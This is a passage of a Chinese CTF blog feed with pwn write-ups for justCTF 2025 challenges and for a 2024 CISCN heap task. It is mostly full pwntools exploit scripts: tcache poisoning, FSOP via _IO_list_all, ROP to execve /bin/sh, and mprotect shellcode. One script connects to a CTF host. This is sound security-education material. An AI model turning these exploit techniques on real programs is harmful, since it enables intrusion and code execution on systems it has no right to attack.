sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    ru(<span class="string">&#x27;Content? &#x27;</span>)</span><br><span class="line">    s(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;Index? &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p=process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;baby-heap.nc.jctf.pro&#x27;</span>,<span class="number">1337</span>,timeout=<span class="number">10</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;0.0.0.0&#x27;,9999)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">key=u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=key&lt;&lt;<span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload=p64(key^he(<span class="number">0x20</span>))</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x700000000</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># add(10,p64(0)+p64(0x101)+p64(he(0x430+0x40*1)^key))</span></span><br><span class="line"><span class="comment"># add(11,p64(0)+p64(0x101)+p64(he(0x430+0x40*2)^key))</span></span><br><span class="line"><span class="comment"># add(12,p64(0)+p64(0x101)+p64(he(0x430+0x40*3)^key))</span></span><br><span class="line"><span class="comment"># add(13,p64(0)+p64(0x101)+p64(he(0x430+0x40*4)^key))</span></span><br><span class="line"><span class="comment"># add(14,p64(0)+p64(0x101)+p64(he(0x430+0x40*5)^key))</span></span><br><span class="line"><span class="comment"># add(15,p64(0)+p64(0x101)+p64(he(0x430+0x40*6)^key))</span></span><br><span class="line"><span class="comment"># add(16,p64(0)+p64(0x101)+p64(key))</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,p64(he(<span class="number">0x2d0</span>)^key))</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">read(<span class="number">2</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x203b20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">_IO_list_all=lis(<span class="string">&#x27;_IO_list_all&#x27;</span>)</span><br><span class="line">IO_wfile_jumps=libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">61</span></span><br><span class="line">system,binsh=getshell()</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(_IO_list_all^key))</span><br><span class="line">add(<span class="number">18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">19</span>,p64(he(<span class="number">0x2a0</span>)))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>))</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(IO_wfile_jumps+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">4</span>,p64(<span class="number">0</span>)+p64(he(<span class="number">0x200</span>))+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(he(<span class="number">0x2e0</span>)))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">edit(<span class="number">7</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(system)+p64(he(<span class="number">0x3a0</span>)))</span><br><span class="line">esc()</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="prospector"><a href="#prospector" class="headerlink" title="prospector"></a>prospector</h2><p>这个题没有libc，只有ld，还是挺有意思的，对于逆向的帮助挺大的</p><p>在Nick输入的时候有栈溢出，可以先修改判断条件的地方为1，然后泄露信息后对照伪代码进行逆运算，就可以得到mmap的地址了，不过有一位不知道，需要爆破一下，16分之一的几率，也是挺快的，mmap的地址和ld地址的偏移是固定的，泄露出ld之后用ld里的gadget就可以getshell了，题目中还给了一个空函数，里面有一些gadget不知道是干啥用的，没用到就可以getshell，可能这是非预期了吧</p><p>因为远程的环境已经停止了，没有试过远程，本地可以通  ) (</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./prospector&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=process(<span class="string">&#x27;./prospector&#x27;</span>)</span><br><span class="line">    <span class="comment"># p=remote(&#x27;prospector.nc.jctf.pro&#x27;,1337)</span></span><br><span class="line">    ru(<span class="string">b&#x27;Nick: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>+p32(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">b&#x27;score: &#x27;</span>)</span><br><span class="line">    key=<span class="built_in">int</span>(ru(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    mmap=((key|<span class="number">0xe0000000</span>)//<span class="number">2</span>)&lt;&lt;<span class="number">16</span></span><br><span class="line">    mmap+=<span class="number">0x8000</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(mmap))</span><br><span class="line">    ld=mmap+<span class="number">0x9000</span></span><br><span class="line">    rdi_rbp=<span class="number">0x0000000000003399</span>+ld</span><br><span class="line">    rsi_rbp=<span class="number">0x0000000000005740</span>+ld</span><br><span class="line">    rax=<span class="number">0x0000000000015b3b</span>+ld</span><br><span class="line">    syscall=<span class="number">0x000000000000b8b9</span>+ld</span><br><span class="line">    binsh=mmap+<span class="number">0x40</span>+<span class="number">0x30</span></span><br><span class="line">    rdx=<span class="number">0x000000000002856e</span>+ld<span class="comment">#mov rdx, qword ptr [rax + 0x10] ; test rdx, rdx ; jne 0x28560 ; ret</span></span><br><span class="line">    ru(<span class="string">b&#x27;Nick: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(mmap)+p64(mmap+<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(rdi_rbp)+p64(binsh-<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(rsi_rbp)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(rax)+p64(mmap+<span class="number">0x100</span>)+p64(rdx)+p64(rax)+p64(<span class="number">0x3b</span>)+p64(syscall))</span><br><span class="line">    ru(<span class="string">b&#x27;Color: &#x27;</span>)</span><br><span class="line">    s(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    data = p.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;Invalid color, try again&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">shell()</span><br></pre></td></tr></table></figure><h2 id="jctfcoin"><a href="#jctfcoin" class="headerlink" title="jctfcoin"></a>jctfcoin</h2><p>看了一下题目，和挖矿的函数没有什么联系，主要在REname，也就是edit的过程中有16字节的溢出，off by one都可以getshell，16字节更不用说了，堆叠后通过堆风水是可以实现泄露libc和heap的，之后也是FSOP就可以了，没什么新东西</p><p>大概看了一下后就没写exp了，QAQ，不要学我这么懒噢~~</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#看啥呢，都说了没写了（；;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;justctf2025-pwn&quot;&gt;&lt;a href=&quot;#justctf2025-pwn&quot; class=&quot;headerlink&quot; title=&quot;justctf2025 pwn&quot;&gt;&lt;/a&gt;justctf2025 pwn&lt;/h1&gt;&lt;pre&gt;&lt;code&gt; 上周打了一下jus</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://gggtaotao.github.io/tags/pwn/"/>
    
    <category term="justctf2025" scheme="https://gggtaotao.github.io/tags/justctf2025/"/>
    
  </entry>
  
  <entry>
    <title>pwn-environ打栈</title>
    <link href="https://gggtaotao.github.io/2025/07/31/pwn-environ%E6%89%93%E6%A0%88/"/>
    <id>https://gggtaotao.github.io/2025/07/31/pwn-environ%E6%89%93%E6%A0%88/</id>
    <published>2025-07-31T09:05:39.000Z</published>
    <updated>2025-07-31T09:15:06.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn-environ打栈学习"><a href="#pwn-environ打栈学习" class="headerlink" title="pwn-environ打栈学习"></a>pwn-environ打栈学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很早前就了解过这个打法了，但是一直没尝试过，今天试着做了一道<strong>2024ciscn ez_heap</strong>来尝试一下environ打栈，其实很简单，environ在libc中，储存着一个栈地址，而这个栈地址与函数栈帧之间的偏移是固定的，通过泄露environ，就可以在堆题中实现对栈的攻击，但其实都能把chunk劫持到栈上进行篡改数据的话，直接修改IO结构体，打IO也是可行的，这里尝试了一下打栈</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目漏洞很简单，比如在add里申请一个0x100的chunk，但是在edit里对这个chunk的修改的size由自己定，且没有上限，你可以修改0x200,0x300甚至更大，很明显的堆溢出，之后泄露heap,泄露libc,泄露stack,然后将chunk劫持到栈上修改ret，控制执行流，就可以了，哦对，这个题开启了沙箱，可以用mprotect修改一个页的权限，然后写进去shellcode，也可以直接用rop链，都是可行的，我这边用的mprotect，记得调用mprotect时修改权限的地址要页对齐噢~~</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-v&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;190&quot;</span>]</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0x0</span></span><br><span class="line">heap_base=<span class="number">0x0</span></span><br><span class="line">pie=<span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getshell</span>() : <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> a : p.recv(a)</span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a  : p.recvuntil(a)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">shell = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">li = <span class="keyword">lambda</span> offset        :libc_base+offset</span><br><span class="line">lis= <span class="keyword">lambda</span> func          :libc_base+libc.symbols[func]</span><br><span class="line">pi = <span class="keyword">lambda</span> offset        :pie+offset</span><br><span class="line">he = <span class="keyword">lambda</span> offset        :heap_base+offset</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ggg = <span class="keyword">lambda</span>              :(gdb.attach(p),pause())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    sla(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    sa(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">esc</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;choice &gt;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./EzHeap&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">key=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">heap_base=key&lt;&lt;<span class="number">12</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x230</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">libc_base=uu64()-<span class="number">0x21ace0</span></span><br><span class="line">environ=li(<span class="number">0x222200</span>)</span><br><span class="line">ogg1=li(<span class="number">0xebc81</span>)</span><br><span class="line">ogg2=li(<span class="number">0xebc85</span>)</span><br><span class="line">ogg3=li(<span class="number">0xebc88</span>)</span><br><span class="line">ogg4=li(<span class="number">0xebce2</span>)</span><br><span class="line">ogg5=li(<span class="number">0xebd38</span>)</span><br><span class="line">ogg6=li(<span class="number">0xebd3f</span>)</span><br><span class="line">ogg7=li(<span class="number">0xebd43</span>)</span><br><span class="line">system,binsh=getshell()</span><br><span class="line">rdi=li(<span class="number">0x000000000002a3e5</span>)</span><br><span class="line">rsi=li(<span class="number">0x000000000002be51</span>)</span><br><span class="line">rdx_r12=li(<span class="number">0x000000000011f2e7</span>)</span><br><span class="line">mprotect=lis(<span class="string">b&#x27;mprotect&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x461</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0x450</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x248</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x230</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x211</span>)+p64((environ-<span class="number">0x210</span>)^key))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x210</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">stack=l64()</span><br><span class="line">shellcode=asm(</span><br><span class="line">    <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        lea rdi,[rip]</span></span><br><span class="line"><span class="string">        add rdi,0x139</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        mov rax, 2</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        lea rsi,[rsp+0x30]</span></span><br><span class="line"><span class="string">        mov rdx, 0x30</span></span><br><span class="line"><span class="string">        mov rax, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rdx,0x30</span></span><br><span class="line"><span class="string">        mov rax,1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span 